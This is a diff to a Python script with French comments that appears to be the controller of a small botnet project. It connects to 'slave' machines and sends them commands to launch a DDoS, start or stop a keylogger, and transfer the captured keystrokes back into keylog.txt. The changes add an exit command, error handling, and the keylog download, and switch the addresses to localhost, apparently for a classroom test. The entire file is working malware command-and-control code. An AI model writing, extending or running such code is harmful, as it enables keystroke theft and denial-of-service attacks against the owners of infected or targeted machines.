@@ -17,15 +17,18 @@ class Connexion():
 
 
     def choixS(self):
-        select = int(input("1)ecoute \n2)connexion \n2)FIN \nSélectionnez une option : "))
-        while select != 3:
-            if select == 1:
-                objetChoixAction.listen(carteReseauEcoute)
-                select = int(input("1)ecoute \n2)connexion \n2)FIN \nSélectionnez une option : "))
-            elif select == 2:
-                objetChoixAction.receive(carteReseauConn, listeIP)
-                select = int(input("1)ecoute \n2)connexion \n2)FIN \nSélectionnez une option : "))
-        
+        try:
+            select = int(input("1)ecoute \n2)connexion \n3)FIN \nSélectionnez une option : "))
+            while select != 3:
+                if select == 1:
+                    objetChoixAction.listen(carteReseauEcoute)
+                    select = int(input("1)ecoute \n2)connexion \n3)FIN \nSélectionnez une option : "))
+                elif select == 2:
+                    objetChoixAction.receive(carteReseauConn, listeIP)
+                    objetChoixAction.choix()
+                    select = int(input("1)ecoute \n2)connexion \n3)FIN \nSélectionnez une option : "))
+        except ValueError:
+            objetChoixAction.choixS()
 
     #1er étape, mettre en place un canal de communication pour recevoir les messages du slave
     def listen(self, carteReseauEcoute):
@@ -53,6 +56,7 @@ class Connexion():
                 for adresse in listeIP:
                     carteReseauConn.connect((adresse, 60000))
                     print("Connection établie avec l'esclave")
+                    
             else:
                 print("On ne connait pas de machine esclave")
         #except: va print "erreur" si il n'y a pas eu de connexion
@@ -94,11 +98,17 @@ class ChoixAction(Connexion):
                 elif select == 3:
                     #lance la methode stop de l'objet choixAction
                     objetChoixAction.stop_log(carteReseauConn)
+                    objetChoixAction.fin(carteReseauConn)
                     #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                     select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                 elif select == 4:
                     #lance la methode get de l'objet choixAction
                     objetChoixAction.get_log(carteReseauConn)
+                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
+                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
+                elif select == 5:
+                    #lance la methode get de l'objet choixAction
+                    objetChoixAction.fin(carteReseauConn)
                     #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                     select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
             #si la connexion est arretée par le client pendant le choix multiple, il affichera le message ci dessous
@@ -110,35 +120,44 @@ class ChoixAction(Connexion):
         #envoie keylogger au client 
         carteReseauConn.send("keylogger".encode("utf-8"))
         #reçois directement sa réponse
-        print(carteReseauConn.recv(1024).decode("utf-8"))
 
     def ddos(self, carteReseauConn):
         #idem
         print("Choix d'attaque : DDoS. Signal envoyé")
         carteReseauConn.send("ddos".encode("utf-8"))
-        print(carteReseauConn.recv(1024).decode("utf-8"))
     
     def stop_log(self, carteReseauConn):
         #idem
         print("Choix d'attaque : stop keylogger. Signal envoyé")
         carteReseauConn.send("stop".encode("utf-8"))
+
         print(carteReseauConn.recv(1024).decode("utf-8"))
     
-    def  get_log(self, carteReseauConn):
+    def get_log(self, carteReseauConn):
         #idem
         print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
         carteReseauConn.send("transfert".encode("utf-8"))
+        fichier = open("keylog.txt", "wb")
+        l = carteReseauConn.recv(1024)
+        fichier.write(l)
+
+
+    def fin(self, carteReseauConn):
+        #idem
+        print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
+        carteReseauConn.send("FIN".encode("utf-8"))
         print(carteReseauConn.recv(1024).decode("utf-8"))
         
     
 #on initie s et adresseMachine
-listeIP = []
-adresseMachine = ("192.168.1.43", 5000)
+listeIP = ["127.0.0.1"]
+adresseMachine = ("localhost", 5000)
 carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
 carteReseauConn = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
 #on assigne l'objet choixAction qui est l'enfant de l'objet Communication à la variable a
 objetChoixAction = ChoixAction(adresseMachine, carteReseauConn, carteReseauEcoute, listeIP)
 objetChoixAction.choixS()
+
 
 
 
